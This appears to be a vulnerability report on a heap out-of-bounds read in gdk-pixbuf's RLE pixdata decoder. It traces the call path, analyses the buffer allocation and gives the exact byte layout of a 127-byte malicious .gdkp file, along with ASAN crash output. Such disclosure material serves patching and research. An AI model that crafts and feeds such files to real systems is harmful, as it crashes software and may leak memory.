# VULN-002: Out-of-Bounds Read in RLE Decoder

**Status: VERIFIED_CRASH**

## Vulnerability

- **File**: `gdk-pixbuf/gdk-pixbuf/gdk-pixdata.c`, lines 459–494
- **Function**: `gdk_pixbuf_from_pixdata()`
- **Type**: heap-buffer-overflow (OOB READ), size 1

The RLE decode loop checks only `image_buffer < image_limit` (the output bound) but has no corresponding guard on `rle_buffer`. After the RLE input bytes are consumed, `rle_buffer` reads past the end of the allocated pixel data on every subsequent loop iteration.

```c
while (image_buffer < image_limit)          // output guard only
{
  guint length = *(rle_buffer++);           // NO rle_buffer bounds check!
  ...
```

## Attack Path

```
gdk_pixbuf_new_from_file(.gdkp)
  -> _gdk_pixbuf_generic_image_load
     -> generic_load_incrementally
        -> pixdata_image_load_increment (io-pixdata.c)
           -> try_load
              -> gdk_pixdata_deserialize()   (parses header; pixel_data = &stream[24])
              -> gdk_pixbuf_from_pixdata()   [OOB READ here]
```

The trigger file format is a `.gdkp` file (GdkPixdata) with magic `GdkP`, which routes through the `io-pixdata` loader in the standard `gdk_pixbuf_new_from_file()` API path used by `gdk-pixbuf-pixdata`.

## GLib GString Allocation Analysis

`g_string_new("")` calls `g_string_sized_new(2)` which internally calls `g_string_maybe_expand(string, MAX(2,64)=64)`. GLib computes the allocation as `g_nearest_pow(MAX(0+64+1, 64)) = g_nearest_pow(65) = 128` bytes. For any file ≤ 127 bytes, no reallocation occurs. The GString's internal buffer is exactly 128 bytes; ASAN marks byte 128 as a red zone.

- File size: **127 bytes** (24-byte header + 103-byte pixel data)
- GString allocation: **128 bytes** (indices 0–127)
- GString null terminator: `str[127]`
- ASAN red zone: `str[128]`

## Crafted File Layout

### Header (24 bytes, big-endian)

| Field         | Value       | Description                    |
|---------------|-------------|--------------------------------|
| magic         | 0x47646b50  | `GdkP`                         |
| length        | 127         | 24 + 103                       |
| pixdata_type  | 0x02010001  | RLE \| SAMPLE_WIDTH_8 \| RGB   |
| rowstride     | 6           | width * bpp = 2 * 3            |
| width         | 2           |                                |
| height        | 28          | image_limit = 6*28 = 168 bytes |

### Pixel Data (103 bytes)

- **Part 1 (100 bytes)**: 25 repeat-1-pixel runs: `\x81\xff\x00\x00` × 25
  - Each run: control `0x81` (bit 7 set, length=1), color bytes `\xff\x00\x00`
  - `rle_buffer` advances 4 bytes per run: 24 → 28 → 32 → … → 124
  - `image_buffer` advances 3 bytes per run: 0 → 3 → … → 75 bytes
- **Part 2 (3 bytes)**: `\x01\x00\x00` — partial literal-1-pixel run at str[124..126]
  - Control `0x01` at str[124] consumed by `*(rle_buffer++)` → `rle_buffer = str[125]`
  - `memcpy(image_buffer, str[125], 3)` reads str[125], str[126], str[127] (null, all within allocation)
  - `rle_buffer += 3` → **str[128] = ASAN red zone**

### Trigger

After the 26th run (25 repeat + 1 literal), `image_buffer = 78 < image_limit = 168`. The loop continues, executes `*(rle_buffer++)` at `str[128]` → **heap-buffer-overflow READ**.

## ASAN Output

```
==387009==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50c000000840
READ of size 1 at 0x50c000000840 thread T0
    #0 gdk_pixbuf_from_pixdata (libgdk_pixbuf-2.0.so.0)
    #1 try_load (libgdk_pixbuf-2.0.so.0)
    #2 pixdata_image_load_increment (libgdk_pixbuf-2.0.so.0)
    #3 generic_load_incrementally (libgdk_pixbuf-2.0.so.0)
    #4 _gdk_pixbuf_generic_image_load (libgdk_pixbuf-2.0.so.0)
    #5 gdk_pixbuf_new_from_file (libgdk_pixbuf-2.0.so.0)
    #6 main (gdk-pixbuf-pixdata)

0x50c000000840 is located 0 bytes to the right of 128-byte region [0x50c0000007c0, 0x50c000000840)
allocated by thread T0 here:
    #0 __interceptor_realloc (asan_malloc_linux.cpp)
    #1 g_realloc (libglib-2.0.so.0)
    #2 generic_load_incrementally (libgdk_pixbuf-2.0.so.0)
```

## Files

| File               | Purpose                              |
|--------------------|--------------------------------------|
| `vuln_002_gen.py`  | Generates `vuln_002.pixdata` (127 B) |
| `vuln_002.pixdata` | Malicious GdkPixdata binary          |
| `vuln_002.gdkp`    | Same file with `.gdkp` extension     |
| `vuln_002_run.sh`  | Runs the binary with ASAN options    |
| `vuln_002_status.txt` | `VERIFIED_CRASH`                  |
